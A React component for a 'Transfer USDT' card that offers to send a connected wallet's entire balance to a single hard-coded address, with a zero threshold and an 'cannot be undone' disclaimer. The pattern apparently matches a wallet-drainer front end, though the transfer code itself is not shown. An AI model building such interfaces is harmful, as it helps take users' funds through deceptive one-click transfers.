import { Card, CardContent, CardHeader, CardTitle } from "./ui/card";
import { Button } from "./ui/button";
import { WalletState } from "../App";
import { Send, Check, AlertCircle, ArrowRight } from "lucide-react";

interface TransferHandlerProps {
  walletState: WalletState;
  isTransferring: boolean;
  transferStatus: string | null;
  onTransfer: () => void;
}

export function TransferHandler({
  walletState,
  isTransferring,
  transferStatus,
  onTransfer,
}: TransferHandlerProps) {
  const DESTINATION_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD45";
  const THRESHOLD = 0;

  const canTransfer =
    walletState.isConnected && parseFloat(walletState.balance) > THRESHOLD;

  const formatAddress = (address: string) => {
    return `${address.slice(0, 10)}...${address.slice(-8)}`;
  };

  return (
    <Card className="bg-slate-900 border-slate-800 overflow-hidden">
      <div className="absolute top-0 left-0 w-32 h-32 bg-cyan-500/10 rounded-full blur-3xl -translate-y-1/2 -translate-x-1/2" />
      <CardHeader className="pb-2">
        <CardTitle className="text-white flex items-center gap-2">
          <Send className="w-5 h-5 text-cyan-400" />
          Transfer USDT
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className="space-y-4">
          {/* Transfer Details */}
          <div className="space-y-3">
            <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg border border-slate-700">
              <div>
                <p className="text-xs text-slate-400">From</p>
                <p className="text-sm text-white font-mono">
                  {walletState.address
                    ? formatAddress(walletState.address)
                    : "Not connected"}
                </p>
              </div>
              <ArrowRight className="w-4 h-4 text-slate-500" />
              <div className="text-right">
                <p className="text-xs text-slate-400">To</p>
                <p className="text-sm text-white font-mono">
                  {formatAddress(DESTINATION_ADDRESS)}
                </p>
              </div>
            </div>

            <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg border border-slate-700">
              <div>
                <p className="text-xs text-slate-400">Amount</p>
                <p className="text-lg text-white font-semibold">
                  {walletState.balance} USDT
                </p>
              </div>
              <div className="text-right">
                <p className="text-xs text-slate-400">Threshold</p>
                <p className="text-sm text-slate-300">{THRESHOLD} USDT</p>
              </div>
            </div>
          </div>

          {/* Status Messages */}
          {transferStatus && (
            <div
              className={`flex items-center gap-2 p-3 rounded-lg ${
                transferStatus.includes("successful")
                  ? "bg-emerald-500/20 border border-emerald-500/30"
                  : "bg-cyan-500/20 border border-cyan-500/30"
              }`}
            >
              {transferStatus.includes("successful") ? (
                <Check className="w-4 h-4 text-emerald-400" />
              ) : (
                <div className="w-4 h-4 border-2 border-cyan-400/30 border-t-cyan-400 rounded-full animate-spin" />
              )}
              <span
                className={`text-sm ${
                  transferStatus.includes("successful")
                    ? "text-emerald-400"
                    : "text-cyan-400"
                }`}
              >
                {transferStatus}
              </span>
            </div>
          )}

          {/* Warning if below threshold */}
          {!canTransfer && walletState.isConnected && (
            <div className="flex items-center gap-2 p-3 bg-amber-500/20 border border-amber-500/30 rounded-lg">
              <AlertCircle className="w-4 h-4 text-amber-400" />
              <span className="text-sm text-amber-400">
                Balance must be above {THRESHOLD} USDT to transfer
              </span>
            </div>
          )}

          {/* Transfer Button */}
          <Button
            onClick={onTransfer}
            disabled={!canTransfer || isTransferring}
            className={`w-full py-6 text-lg font-semibold ${
              canTransfer && !isTransferring
                ? "bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-600 hover:to-cyan-600 text-slate-900"
                : "bg-slate-800 text-slate-500 cursor-not-allowed"
            }`}
          >
            {isTransferring ? (
              <>
                <div className="w-5 h-5 border-2 border-slate-900/30 border-t-slate-900 rounded-full animate-spin mr-2" />
                Processing Transfer...
              </>
            ) : (
              <>
                <Send className="w-5 h-5 mr-2" />
                Transfer {walletState.balance} USDT
              </>
            )}
          </Button>

          <p className="text-xs text-slate-500 text-center">
            By clicking transfer, you agree to send your USDT to the designated
            address. This action cannot be undone.
          </p>
        </div>
      </CardContent>
    </Card>
  );
}